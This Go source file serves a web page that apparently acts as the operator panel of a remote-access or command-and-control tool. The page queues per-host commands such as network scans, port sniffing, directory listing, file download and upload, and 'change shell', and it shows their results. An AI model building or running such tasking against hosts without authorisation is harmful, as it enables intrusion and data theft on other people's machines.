package web_ui
import (
	"fmt"
	"net/http"
)
func MsgHtml(error_str string, sessionSlice []string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		//必须先登录
		_, ok := CheckUserSession(r, sessionSlice,error_str)
        if !ok {
            fmt.Fprint(w, error_str)
            return
        }
		if r.Method == http.MethodGet {
			html := `
    
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style>
        body {
            font-family: sans-serif;
            padding: 20px;
            background-color: #f7f7f7;
        }
        .msg-item {
            background: white;
            border: 1px solid #ccc;
            padding: 10px;
            margin-bottom: 8px;
            position: relative;
        }
        .btn-group {
            position: absolute;
            right: 10px;
            top: 10px;
        }
        .move-btn, .del-btn {
            margin-left: 5px;
            padding: 4px 6px;
            font-size: 14px;
        }
        .msg-item span {
            user-select: none;
        }
        .msg-item span[title] {
            color: blue;
            text-decoration: underline dotted;
        }
    </style>
</head>
<body>
    <div style="display: flex; align-items: center;">
        <h2>Msg list</h2>
        <p id='hostname' style='margin-left: 25px;'></p>
    </div>
    <div id="msg-container">loading...</div>
    <script>
        let urlParams = new URLSearchParams(window.location.search);
        let host = urlParams.get('host');
		let hostname = document.getElementById('hostname');
		hostname.innerText = "Host:" + host;
        const msgContainer = document.getElementById('msg-container');
        const uid = new URLSearchParams(window.location.search).get('uid');
        const server = window.location.protocol + "//" + window.location.host;

        function loadMessages() {
            msgContainer.innerHTML = ''; // 清空整个容器

            // 加载 getMsgList 消息
            fetch(server + "/user_index?op=getMsgList&uid=" + uid)
                .then(res => res.json())
                .then(data1 => {
                    if (data1.messages && data1.messages.length > 0) {
                        data1.messages.forEach((msg, index) => {
                            const msgElement = createMsgWithButtons(msg, index);
                            msgContainer.appendChild(msgElement);
                        });
                    }
                    // 加载 getMsgPost 消息（result list）
                    return fetch(server + "/user_index?op=getMsgPost&uid=" + uid);
                })
                .then(response => response.json())
                .then(data => {
                    if (data.messages && data.messages.length > 0) {
                        const postTitle = document.createElement('h2');
                        postTitle.textContent = 'result List';
                        msgContainer.appendChild(postTitle);
                        data.messages.forEach((msg, index) => {
                            const msgDiv = document.createElement('div');
                            msgDiv.className = 'msg-item';
                            msgDiv.style.display = 'flex';
                            msgDiv.style.justifyContent = 'space-between';
                            msgDiv.style.alignItems = 'center';
                            msgDiv.style.gap = '8px';
                            const shortText = msg.length > 10 ? msg.slice(0, 10) + '…' : msg;
                            let expanded = false;
                            const span = document.createElement('span');
                            span.textContent = shortText;
                            span.style.cursor = 'pointer';
                            span.onclick = () => {
                                expanded = !expanded;
                                span.textContent = expanded ? msg : shortText;
                            };
                            // ✅ 按钮容器
                            const btnGroup = document.createElement('div');
                            btnGroup.style.display = 'flex';
                            btnGroup.style.gap = '4px'; // 两个按钮之间的间距小一点

                            // 复制按钮
                            const copyBtn = document.createElement('button');
                            copyBtn.textContent = '📋';
                            copyBtn.className = 'copy-btn';
                            copyBtn.title = '复制';
                            copyBtn.onclick = () => {
                                navigator.clipboard.writeText(msg).then(() => {
                                    copyBtn.textContent = '✅';
                                    setTimeout(() => copyBtn.textContent = '📋', 1000);
                                }).catch(console.error);
                            };

                            // 删除按钮
                            const delBtn = document.createElement('button');
                            delBtn.textContent = '🗑';
                            delBtn.className = 'del-btn';
                            delBtn.title = '删除';
                            delBtn.onclick = () => {
                                const idx = Array.from(msgDiv.parentElement.children).indexOf(msgDiv) - 1;
                                const url = server + "/user_index?op=delMsgMap"
                                    + "&uid=" + encodeURIComponent(uid)
                                    + "&index=" + idx;
                                fetch(url, { method: 'GET' })
                                    .then(() => msgDiv.remove())
                                    .catch(console.error);
                            };

                            // ✅ 将两个按钮放入按钮容器
                            btnGroup.appendChild(copyBtn);
                            btnGroup.appendChild(delBtn);

                            // ✅ 将 span 和按钮容器加入主容器
                            msgDiv.appendChild(span);
                            msgDiv.appendChild(btnGroup);
                            msgContainer.appendChild(msgDiv);
                        });
                    }
                })
                .catch(error => {
                    console.error("消息获取失败：", error);
                });
        }

        // 初次加载
        loadMessages();

        // 每 30 秒自动刷新一次
        setInterval(loadMessages, 30000);

        // 其他函数不变
        function createMsgWithButtons(rawMsg, index) {
            const parts = rawMsg.split('^');
            let msgText = rawMsg; // 默认展示原始消息
            if (parts[0] === 'GET_U_FRIENDS') {
                msgText = 'scan:    ' + parts[1]+ '     range:    '+parts[2]+ '     delay:     '+parts[3];
            }else if (parts[0] === 'GET_DELAY') {
                msgText = 'change delay:     ' + parts[1] + '     seconds';
            }else if (parts[0] === 'GET_U_FILE') {
                msgText = 'File:     ' + parts[1] + ' Size:    ' + parts[2] + '    bytes';
            }else if (parts[0] === 'LOAD_U_FILE') {
                msgText = 'File: ' + parts[1];
            }else if (parts[0] === 'LOOK_UP_FILE') {
                msgText = 'lookDir:     ' + parts[1];
            }else if (parts[0] === 'GET_PORTS'){
                msgText = 'sniff:     ' + parts[1]+ '     range:     '+parts[2]+ '     delay:     '+parts[3];
            }else if (parts[0] === 'SWITCH_VERSION'){
                msgText = 'change shell:     ' + parts[1];
            }
            const msgDiv = document.createElement('div');
            msgDiv.className = 'msg-item';
            msgDiv.dataset.index = index;

            const idxStr = String(index).padStart(2, '0');
            const indexLabel = document.createElement('span');
            indexLabel.textContent = "[" + idxStr.slice(0, 10) + "] ";
            msgDiv.appendChild(indexLabel);
            msgDiv.appendChild(document.createTextNode(msgText));

            const btnGroup = document.createElement('div');
            btnGroup.className = 'btn-group';

            const upBtn = document.createElement('button');
            upBtn.textContent = '⬆';
            upBtn.className = 'move-btn';
            upBtn.onclick = () => {
                const prev = msgDiv.previousElementSibling;
                if (prev) {
                    msgContainer.insertBefore(msgDiv, prev);
                    sendReorder(msgDiv, prev);
                }
            };

            const downBtn = document.createElement('button');
            downBtn.textContent = '⬇';
            downBtn.className = 'move-btn';
            downBtn.onclick = () => {
                const next = msgDiv.nextElementSibling;
                if (next) {
                    msgContainer.insertBefore(next, msgDiv);
                    sendReorder(msgDiv, next);
                }
            };

            const delBtn = document.createElement('button');
            delBtn.textContent = '🗑';
            delBtn.className = 'del-btn';
            delBtn.onclick = () => {
                const idx = Array.from(msgContainer.children).indexOf(msgDiv);
                if (idx >= 0) {
                    const url = server + "/user_index?op=delMsgGet"
                        + "&uid=" + encodeURIComponent(uid)
                        + "&index=" + idx;
                    fetch(url, { method: 'GET' })
                        .then(() => msgDiv.remove())
                        .catch(console.error);
                }
            };

            btnGroup.appendChild(upBtn);
            btnGroup.appendChild(downBtn);
            btnGroup.appendChild(delBtn);
            msgDiv.appendChild(btnGroup);

            return msgDiv;
        }

        function sendReorder(sourceDiv, targetDiv) {
            const s_id = Array.from(msgContainer.children).indexOf(sourceDiv);
            const pos = Array.from(msgContainer.children).indexOf(targetDiv);
            if (s_id === -1 || pos === -1) return;
            const url = server + "/user_index?op=changeMsh"
                + "&uid=" + encodeURIComponent(uid)
                + "&s_id=" + s_id
                + "&pos=" + pos;
            fetch(url).catch(console.error);
        }
    </script>
</body>
</html>
`
			w.Header().Set("Content-Type", "text/html")
			fmt.Fprint(w, html)
			return
		}
	}
}